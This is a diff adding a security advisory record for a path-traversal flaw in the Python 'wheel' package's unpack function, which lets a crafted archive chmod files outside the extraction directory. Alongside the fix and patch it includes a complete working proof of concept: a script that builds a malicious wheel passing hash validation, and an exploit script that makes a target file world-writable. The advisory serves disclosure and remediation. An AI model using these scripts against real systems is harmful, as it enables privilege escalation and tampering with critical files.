@@ -1,0 +1,140 @@
+{
+  "id": "GHSA-8rrh-rw8j-w5fx",
+  "modified": "2026-01-22T18:26:26.550161Z",
+  "published": "2026-01-22T18:02:56Z",
+  "aliases": [
+    "CVE-2026-24049"
+  ],
+  "summary": "Wheel Affected by Arbitrary File Permission Modification via Path Traversal in wheel unpack",
+  "details": "### Summary\n - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  \n - **Root Cause Component:** wheel.cli.unpack.unpack function.  \n - **Affected Packages:**  \n   1. wheel (Upstream source)  \n   2. setuptools (Downstream, vendors wheel)  \n - **Severity:** High (Allows modifying system file permissions).  \n\n### Details  \nThe vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  \n```\n# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)\nfor zinfo in wf.filelist:\n    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile\n\n    # (2) VULNERABILITY:\n    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.\n    # If zinfo.filename contains \"../\", this targets files outside the destination.\n    permissions = zinfo.external_attr \u003e\u003e 16 \u0026 0o777\n    destination.joinpath(zinfo.filename).chmod(permissions)\n```  \n\n### PoC  \nI have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  \n\n**Prerequisites:** pip install setuptools  \n\n**Step 1: Generate the Malicious Wheel (gen_poc.py)**  \nThis script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  \n```\nimport zipfile\nimport hashlib\nimport base64\nimport os\n\ndef urlsafe_b64encode(data):\n    \"\"\"\n    Helper function to encode data using URL-safe Base64 without padding.\n    Required by the Wheel file format specification.\n    \"\"\"\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')\n\ndef get_hash_and_size(data_bytes):\n    \"\"\"\n    Calculates SHA-256 hash and size of the data.\n    These values are required to construct a valid 'RECORD' file,\n    which is used by the 'wheel' library to verify integrity.\n    \"\"\"\n    digest = hashlib.sha256(data_bytes).digest()\n    hash_str = \"sha256=\" + urlsafe_b64encode(digest)\n    return hash_str, str(len(data_bytes))\n\ndef create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):\n    print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")\n\n    # 1. Prepare Standard Metadata Content\n    # These are minimal required contents to make the wheel look legitimate.\n    wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"\n    metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"\n   \n    # 2. Define Malicious Payload (Path Traversal)\n    # The content doesn't matter, but the path does.\n    payload_content = b\"PWNED by Path Traversal\"\n\n    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'\n    # The vulnerability allows 'chmod' to affect this path directly.\n    malicious_path = \"../../poc_target.txt\"\n\n    # 3. Calculate Hashes for Integrity Check Bypass\n    # The 'wheel' library verifies if the file hash matches the RECORD entry.\n    # To bypass this check, we calculate the correct hash for our malicious file.\n    wheel_hash, wheel_size = get_hash_and_size(wheel_content)\n    metadata_hash, metadata_size = get_hash_and_size(metadata_content)\n    payload_hash, payload_size = get_hash_and_size(payload_content)\n\n    # 4. Construct the 'RECORD' File\n    # The RECORD file lists all files in the wheel with their hashes.\n    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.\n    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.\n    record_lines = [\n        f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",\n        f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",\n        f\"{malicious_path},{payload_hash},{payload_size}\",  # \u003c-- Authenticating the malicious path\n        \"evil-1.0.dist-info/RECORD,,\"\n    ]\n    record_content = \"\\n\".join(record_lines).encode('utf-8')\n\n    # 5. Build the Zip File\n    with zipfile.ZipFile(filename, \"w\") as zf:\n        # Write standard metadata files\n        zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)\n        zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)\n        zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)\n\n        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file\n        # We need to set specific permission bits to trigger the vulnerability.\n        zinfo = zipfile.ZipInfo(malicious_path)\n       \n        # Set external attributes to 0o777 (rwxrwxrwx)\n        # Upper 16 bits: File type (0o100000 = Regular File)\n        # Lower 16 bits: Permissions (0o777 = World Writable)\n        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.\n        zinfo.external_attr = (0o100000 | 0o777) \u003c\u003c 16\n       \n        zf.writestr(zinfo, payload_content)\n\n    print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")\n\nif __name__ == \"__main__\":\n    create_evil_wheel_v4()\n```  \n\n**Step 2: Run the Exploit (exploit.py)**  \n```\nfrom pathlib import Path\nimport sys\n\n# Demonstrating impact on setuptools\ntry:\n    from setuptools._vendor.wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from setuptools\")\nexcept ImportError:\n    from wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from wheel\")\n\n# 1. Setup Target (Read-Only system file simulation)\ntarget = Path(\"poc_target.txt\")\ntarget.write_text(\"SENSITIVE CONFIG\")\ntarget.chmod(0o400) # Read-only\nprint(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")\n\n# 2. Run Vulnerable Unpack\n# The wheel contains \"../../poc_target.txt\".\n# unpack() will extract safely, BUT chmod() will hit the actual target file.\ntry:\n    unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\")\nexcept Exception as e:\n    print(f\"[!] Ignored expected extraction error: {e}\")\n\n# 3. Check Result\nfinal_perms = oct(target.stat().st_mode)[-3:]\nprint(f\"[*] Final Perms: {final_perms}\")\n\nif final_perms == \"777\":\n    print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\")\nelse:\n    print(\"[-] Attack failed.\")\n```  \n\n**result:**  \n\u003cimg width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" /\u003e  \n  \n### Impact  \nAttackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  \n\n### Recommended Fix  \nThe unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  \n\n### Suggested Patch:  \n```\n# extract() returns the actual path where the file was written\nextracted_path = wf.extract(zinfo, destination)\n\n# Only apply chmod if a file was actually written\nif extracted_path:\n    permissions = zinfo.external_attr \u003e\u003e 16 \u0026 0o777\n    Path(extracted_path).chmod(permissions)\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "wheel",
+        "purl": "pkg:pypi/wheel"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.46.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.11.0",
+        "0.12.0",
+        "0.13.0",
+        "0.14.0",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.19.0",
+        "0.2",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.27.0",
+        "0.28.0",
+        "0.29.0",
+        "0.3",
+        "0.30.0",
+        "0.30.0a0",
+        "0.31.0",
+        "0.31.1",
+        "0.32.0",
+        "0.32.1",
+        "0.32.2",
+        "0.32.3",
+        "0.33.0",
+        "0.33.1",
+        "0.33.4",
+        "0.33.5",
+        "0.33.6",
+        "0.34.0",
+        "0.34.1",
+        "0.34.2",
+        "0.35.0",
+        "0.35.1",
+        "0.36.0",
+        "0.36.1",
+        "0.36.2",
+        "0.37.0",
+        "0.37.1",
+        "0.38.0",
+        "0.38.1",
+        "0.38.2",
+        "0.38.3",
+        "0.38.4",
+        "0.4",
+        "0.4.1",
+        "0.4.2",
+        "0.40.0",
+        "0.41.0",
+        "0.41.1",
+        "0.41.2",
+        "0.41.3",
+        "0.42.0",
+        "0.43.0",
+        "0.44.0",
+        "0.45.0",
+        "0.45.1",
+        "0.46.0",
+        "0.46.1",
+        "0.5",
+        "0.6",
+        "0.7",
+        "0.8",
+        "0.9",
+        "0.9.1",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.46.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-8rrh-rw8j-w5fx/GHSA-8rrh-rw8j-w5fx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/wheel/security/advisories/GHSA-8rrh-rw8j-w5fx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24049"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/wheel/commit/7a7d2de96b22a9adf9208afcc9547e1001569fef"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pypa/wheel"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/wheel/releases/tag/0.46.2"
+    }
+  ]
+}
